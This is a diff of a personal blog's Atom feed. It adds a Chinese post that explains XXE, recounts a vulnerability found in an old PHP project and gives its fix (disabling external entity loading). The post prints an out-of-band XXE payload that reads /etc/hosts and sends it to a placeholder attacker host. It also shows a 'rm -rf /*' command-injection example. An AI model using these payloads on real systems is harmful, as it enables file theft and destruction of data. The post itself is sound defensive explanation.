@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sevencai.github.io/"/>
-  <updated>2020-04-24T09:53:49.000Z</updated>
+  <updated>2020-06-30T15:05:45.000Z</updated>
   <id>http://sevencai.github.io/</id>
   
   <author>
@@ -16,13 +16,77 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>记一次XXE漏洞</title>
+    <link href="http://sevencai.github.io/2020/06/20/%E8%AE%B0%E4%BA%94%E6%9C%88%E5%92%8C%E5%85%AD%E6%9C%88/"/>
+    <id>http://sevencai.github.io/2020/06/20/记五月和六月/</id>
+    <published>2020-06-20T11:11:54.000Z</published>
+    <updated>2020-06-30T15:05:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近很忙，没有停下来脚步思考一些事情，没有整理遇到过的问题，没有停下来脚步听听内心的声音。</p>
+<hr>
+<h2 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h2><blockquote>
+<p>某天安平的同事扫出来了我们以前很老旧的某个PHP项目有XXE漏洞，对于XXE之前没有碰到过这种漏洞，通过漏洞单的大概描述，了解了大概是跟XML以及DTD有关系。</p>
+</blockquote>
+<p>XXE称为XML实体注入(XML External Entity)，他出现在我们的XML文件内，当允许引用外部实体时，通过构造恶意实体内容，从而可能导致如：</p>
+<p>1、读取任意文件（read file）<br>2、内网端口探测（scan port）<br>3、服务端请求伪造 （SSRF）<br>4、执行系统命令 （exec command）</p>
+<p>了解XXE需要先大致的了解下XML以及DTD。</p>
+<hr>
+<h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML是一种是一种类似HTML的可扩展标记语言，它的标记都是自定义的，其设计宗旨是包含和传输数据。和HTML不一样，他的核心设计是包含和传输数据，类似于json。而HTML偏向于展示内容和数据。在Android应用编写和微信公众号里之前经常会用到。举例为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。<br>DTD包括两种类型：内部的 DOCTYPE 声明以及外部文档声明。</p>
+<hr>
+<h3 id="内部的-DOCTYPE-声明"><a href="#内部的-DOCTYPE-声明" class="headerlink" title="内部的 DOCTYPE 声明"></a>内部的 DOCTYPE 声明</h3><p>内部的声明被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//规范</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line"></span><br><span class="line">// 举例</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>解释为：<br><code>!DOCTYPE note</code> (第二行)定义此文档是 note 类型的文档。<br><code>!ELEMENT note</code> (第三行)定义 note 元素有四个元素：”to、from、heading,、body”<br><code>!ELEMENT to</code> (第四行)定义 to 元素为 “#PCDATA” 类型<br><code>!ELEMENT from</code> (第五行)定义 from 元素为 “#PCDATA” 类型<br><code>!ELEMENT heading</code> (第六行)定义 heading 元素为 “#PCDATA” 类型<br><code>!ELEMENT body</code> (第七行)定义 body 元素为 “#PCDATA” 类型</p>
+<hr>
+<h3 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h3><p>假如 DTD 位于 XML 源文件的外部，那么XML通过这种方式引用的，就叫做外部文档声明。那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 规范</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>包含 DTD 的 “note.dtd” 文件可能为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>上面的这个文件可能是个系统路径，实际上他还可能是个http文件地址。比如：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt; <span class="meta">&lt;!DOCTYPE file [&lt;!ENTITY % aaa SYSTEM "http://xxxxx.ip/xx.dtd"&gt;%aaa;%ccc;%ddd;]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>DTD的好处就是比较好的能够描述自身格式的描述、可以使用某个统一的标准来定义格式。</p>
+<hr>
+<h2 id="XXE漏洞的原理及案例"><a href="#XXE漏洞的原理及案例" class="headerlink" title="XXE漏洞的原理及案例"></a>XXE漏洞的原理及案例</h2><p>了解了XML以及DDT,再来了解XXE就比较清楚了。XXE出现于上面两种方式中的：外部文档声明的情况。<strong>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</strong></p>
+<p>比如本次我遇到的漏洞就是通过向我们的那个老旧的php文件post以下内容后，就可以得到<code>/etc/hosts</code>内的内容了。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt; <span class="meta">&lt;!DOCTYPE file [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % aaa SYSTEM "http://xxxxx.ip/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %aaa;%ccc;%ddd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>evil.dtd里面的内容可能是:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % bbb SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts"&gt;&lt;!ENTITY % ccc "&lt;!ENTITY % ddd SYSTEM 'http://xxx.ip/b?%bbb;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p>
+<p>类似的，可以把<code>evil.dtd</code>里的文件内容变成<code>etc/passwd</code>。这个是非常危险的操作。</p>
+<p>最后我使用的解决方法比较简单，在php内禁用实体的外部引用即可。如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="扩展案例"><a href="#扩展案例" class="headerlink" title="扩展案例"></a>扩展案例</h2><p>以上我遇到的案例是XXE的风险之一-读取文件漏洞，除了这以外，在学习这个过称中我还看到了有其他的案例也会造成多样的漏洞问题，这里总结如下：（特别说明下：以下案例非真实经历，如果图片涉及到了侵权，麻烦联系我及时删掉）。</p>
+<h3 id="文件读取漏洞"><a href="#文件读取漏洞" class="headerlink" title="文件读取漏洞"></a>文件读取漏洞</h3><p>如显示的展示漏洞，比如读到了xml信息后,直接print出来。显示的打印出来了<code>xml</code>信息。里面就有引用实体的内容。<br><img src="xianshi.png" alt="显示读取"></p>
+<p>数据即使不回显也可能会有问题，因为可以想办法触发漏洞以后把文件发送到攻击者的网站。如上我自己遇到的案例就是这种情况。<br><img src="sendserver.png" alt="不显示读取"><br>dtd文件为：<br><img src="sendserverdtd.png" alt="dtd文件"><br>这样触发了工具后，就把漏洞发送到攻击者的网站了。验证自己有没有解决这个问题，就可以查看有没有给这个网站发送请求即可。</p>
+<hr>
+<h3 id="SSRF攻击"><a href="#SSRF攻击" class="headerlink" title="SSRF攻击"></a>SSRF攻击</h3><p><img src="ssrf.png" alt="服务端攻击"></p>
+<p>这个就比较好理解了，有一丢丢类似于前端的csrf。这里利用了文件可以引用外部实体的因素，利用服务器做中转去访问了第三方网站。</p>
+<hr>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p><img src="exec.png" alt="执行命令"><br>如上是安装expect扩展的PHP环境里执行系统命令。感觉有一丢丢像我之前了解的命令行注入的影子。命令行注入是指：命令行注入漏洞，指的是攻击者能够通过 HTTP 请求直接侵入主机，执行攻击者预设的 shell 命令。<br><img src="zhuru.png" alt="命令行注入"><br>比如上面的这个如果传入的是<code>git clone xxx &amp;&amp; rm -rf /*</code>，然后又刚好有root权限就完了。</p>
+<hr>
+<h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p><img src="tance.png" alt="探测"><br>这个例子探测了192.168.1.1的80、81端口，通过返回的状态，比如“Connection refused”可以知道哪个是开的哪个是关掉的。另外还可以把IP换成域名，利用当前服务器DNS尝试解析内部域名来获取内网IP。</p>
+<hr>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>目前有两种比较简单和有效的方法：</p>
+<p>1、第一种是直接在代码中禁用外部的实体引用。如上实际案例中我就是通过这种方法解决的。<br>2、可以通过过滤关键词的方法，如把<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、<code>SYSTEM</code>、<code>PUBLIC</code>过滤掉。但是这个要小心处理，有一定的风险。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上记录了我经历的之前的一次XXE漏洞，通过解决这个漏洞，去了解了类似的漏洞。比较感兴趣因此记录了下来。</p>
+<p>最近被一些问题困扰，不是技术问题，会有很难受的时候，但是问题总会被解决，时间会证明一切。如果这个过称中你难受了，那就积极的去解决问题，正面面对他。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近很忙，没有停下来脚步思考一些事情，没有整理遇到过的问题，没有停下来脚步听听内心的声音。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&quot;XXE-漏洞&quot;&gt;&lt;a href=&quot;#XXE-漏洞&quot; class=&quot;headerlink&quot; title=&quot;XXE 漏洞&quot;&gt;&lt;/a&gt;XXE 漏洞&lt;/h2
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>近日梳理</title>
     <link href="http://sevencai.github.io/2020/04/25/%E8%BF%91%E6%97%A5%E6%A2%B3%E7%90%86/"/>
     <id>http://sevencai.github.io/2020/04/25/近日梳理/</id>
     <published>2020-04-25T06:52:16.000Z</published>
-    <updated>2020-04-24T09:53:49.000Z</updated>
+    <updated>2020-05-18T11:12:38.000Z</updated>
     
-    <content type="html"><![CDATA[<p>一般是工作中遇到问题，不太会解决后立即总结，而是解决后在记录本里写一到两个关键字，过了一个月以后再一起总结，这样会有个加固记忆的过称。(为自己的偷懒找个合适的接口🐩🌶)</p>
+    <content type="html"><![CDATA[<p>一般是工作中遇到问题，不太会解决后立即总结，而是解决后在记录本里写一到两个关键字，过了一个月以后再一起总结，这样会有个加固记忆的过称。(为自己的偷懒找个合适的借口🐩🌶)</p>
 <hr>
 <h2 id="关于-csp"><a href="#关于-csp" class="headerlink" title="关于 csp"></a>关于 csp</h2><p>好几个月之前定位一个同事遗留下来的项目，当时是在手机上，抓包看发现某个请求怎么都发布出去，突然发现有个<code>report/csp</code>这个请求。瞬间明白了，可能是服务器限制了csp。</p>
 <p>本地使用<code>whisle</code> 的<code>`xxx.qq.com disable://csp</code>一下就解决了。这件事情告诉了我知识储备有多么重要，如果不是因为去年去了解xss, 无意间接触了下csp的限制以及了解了他的<code>report-uri</code>，估计也不会这么快定位出来问题。</p>
@@ -83,7 +147,7 @@
     
     <summary type="html">
     
-      &lt;p&gt;一般是工作中遇到问题，不太会解决后立即总结，而是解决后在记录本里写一到两个关键字，过了一个月以后再一起总结，这样会有个加固记忆的过称。(为自己的偷懒找个合适的接口🐩🌶)&lt;/p&gt;
+      &lt;p&gt;一般是工作中遇到问题，不太会解决后立即总结，而是解决后在记录本里写一到两个关键字，过了一个月以后再一起总结，这样会有个加固记忆的过称。(为自己的偷懒找个合适的借口🐩🌶)&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&quot;关于-csp&quot;&gt;&lt;a href=&quot;#关于-csp&quot; class=&quot;
     
@@ -1444,61 +1508,6 @@
     
     
       <category term="Javascript" scheme="http://sevencai.github.io/tags/Javascript/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>记几个小知识点</title>
-    <link href="http://sevencai.github.io/2018/11/20/%E8%AE%B0%E5%87%A0%E4%B8%AA%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
-    <id>http://sevencai.github.io/2018/11/20/记几个小知识点/</id>
-    <published>2018-11-20T13:14:33.000Z</published>
-    <updated>2018-11-20T13:21:50.000Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote>
-<p>好久都没有更新博客了，之前经历了疯狂的一段加班时间，收获了下面一句话，对我来说很珍贵的经验。📒</p>
-<p><strong>再短也要记得思考，再忙也要记得时不时停下来，不慌不忙一步步走稳</strong>~📚</p>
-</blockquote>
-<hr>
-<h2 id="在-url-上增加参数"><a href="#在-url-上增加参数" class="headerlink" title="在 url 上增加参数"></a>在 url 上增加参数</h2><p>下面这段是一段给 url 增加参数的代码片段：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在 url 上添加参数</span></span><br><span class="line"><span class="comment"> * @param arr  Array or Object</span></span><br><span class="line"><span class="comment"> * @param url</span></span><br><span class="line"><span class="comment"> * @return &#123;string|*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">addParam</span>(<span class="params">arr, url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> names = <span class="built_in">Object</span>.keys(arr)</span><br><span class="line">  <span class="keyword">var</span> postfix = serializeParams(arr)</span><br><span class="line"></span><br><span class="line">  url = delParam(names, url)</span><br><span class="line">  url += <span class="regexp">/(\?|&amp;)$/</span>.test(url) ? <span class="string">""</span> + postfix : <span class="regexp">/\?/</span>.test(url) ? <span class="string">"&amp;"</span> + postfix : <span class="string">"?"</span> + postfix</span><br><span class="line">  <span class="keyword">return</span> url</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>除去写法问题，逻辑上能看出有什么问题吗❌？</p>
-<p>它只支持不带 hash 的增加参数，对于带 hash 的url, 它基本不能使用。因为这个方法已经被其他人使用，为了最小的改动性，可以在上面再封装一次。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">addHashParam</span>(<span class="params">arr, url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> [prefix, suffix] = url.split(<span class="string">"#"</span>)</span><br><span class="line">  <span class="keyword">let</span> addedUrl = addParam(arr, prefix)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (suffix) &#123;</span><br><span class="line">    <span class="keyword">return</span> [addedUrl, <span class="string">"#"</span>, suffix].join(<span class="string">""</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> addedUrl</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>简单的 split 一下，再对 hash 之前的进行 addParam, 最后再拼接回去即可。</p>
-<hr>
-<h2 id="chrome-breakpoints"><a href="#chrome-breakpoints" class="headerlink" title="chrome breakpoints"></a>chrome breakpoints</h2><p>今天又把 chrome 的 <a href="https://developers.google.com/web/tools/chrome-devtools/javascript/breakpoints?hl=zh-cn" target="_blank" rel="noopener">breakpoints 的文档</a>瞟了一遍。希望自己能把下面这个图记清楚：</p>
-<p><img src="chromebreakpoint.png" alt="Overview of when to use each breakpoint type"></p>
-<p>平时还是得刻意有意的去使用不同的类型断点形式，这样才不会如果突然事件很紧发现问题时，手忙脚乱。</p>
-<p>比如上面这些断点类型中， <code>Line-of-code</code>，<code>Conditional line-of-code</code>，<code>Exception</code> 用的比较多，其他几个如 <code>DOM</code>, <code>Xhr</code>, <code>Function</code> 用的比较📒少。</p>
-<hr>
-<h2 id="关于网络的小知识"><a href="#关于网络的小知识" class="headerlink" title="关于网络的小知识"></a>关于网络的小知识</h2><p>最近公司的网络部分打通了，对于 mac pro 而言，以前非常不好真机调试，现在非常方便了我们。去了解了下这里面的工作。</p>
-<blockquote>
-<p>同一网段：要判断两个IP地址是不是在同一个网段，就将它们的IP地址分别与<strong>子网掩码</strong>做<strong>与运算</strong>，得到的结果一网络号，如果网络号相同，就在同一子网，否则，不在同一子网。</p>
-<p>一般情况下，如果两个设备的 IP 地址前三位都是一样的话，就算是位于同一网段。</p>
-</blockquote>
-<p>抓包或者真机调试需要电脑和手机在同一网段下。 现在由于网络打通，都在同一局域网内，直接手机上配置代理，连接电脑相应的端口即可。一般我们为了抓包，电脑上会装 fiddler or charles or whistle, 我这里使用 whistle 开启了一个新端口，手机就连这个端口即可抓包。</p>
-<p>原先由于我们的手机和电脑不是同一个网络，所以才需要软AP如 小米 WIFI 这种东西去使手机和电脑在同一个网络里，进行抓包。</p>
-<p>这里出来了一个新词，叫做 <strong>软AP</strong>。</p>
-<p>软AP指的是：<strong>“软AP”的无线产品在市场上颇为常见，软AP就是Soft-AP，它的硬件部分就是一块标准的无线网卡，但其通过驱动程序使其提供与AP一样的信号转接、路由等功能</strong>。与传统AP相比，它的成本很低，功能上也能凑合。</p>
-<p>简单的理解话<strong>AP 就是 AccessPoint ,是无限访问热点的简称，无限路由器可以称为 AP, 软AP 则是用软件和无线王卡结合模拟出来的</strong>。</p>
-<p>是否需要这个软AP跟我们的网络有关系。若电脑和手机处于一个网段，就不需要软AP创建WIFI网络。若不在一个网络，就需要用到软AP软件。比如你的电脑是连的自家的WIFI,你的手机是4G网络。或者你的电脑是有限网络，手机是无线网络，那么很有可能就不在一个网段上。</p>
-<blockquote>
-<p>在同一个局域网内是可以相互连接到对方的广播的，也可以冒认接收端来截取数据。或者混乱arp数据包，进行全部抓取。那么如何将mac和iPhone连接到同一个局域网呢？方法一，将两个设备都连接一个wifi路由器；方法二，将mac连接以太网，然后在 系统偏好设置——共享 中设置共享以太网来源的连接，然后用wifi端口共享给电脑（手机）。然后再将手机去连接电脑发散出的wifi。</p>
-</blockquote>
-<hr>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要对未来有信心，要对自己做的事情写的代码抱有信念，要跟随自己的心。（不是对别人的鸡汤，是对自己的鼓励，加油）🌹</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;
-&lt;p&gt;好久都没有更新博客了，之前经历了疯狂的一段加班时间，收获了下面一句话，对我来说很珍贵的经验。📒&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;再短也要记得思考，再忙也要记得时不时停下来，不慌不忙一步步走稳&lt;/strong&gt;~📚&lt;/p&gt;
-&lt;/blockquote
-    
-    </summary>
-    
-    
-      <category term="笔记" scheme="http://sevencai.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
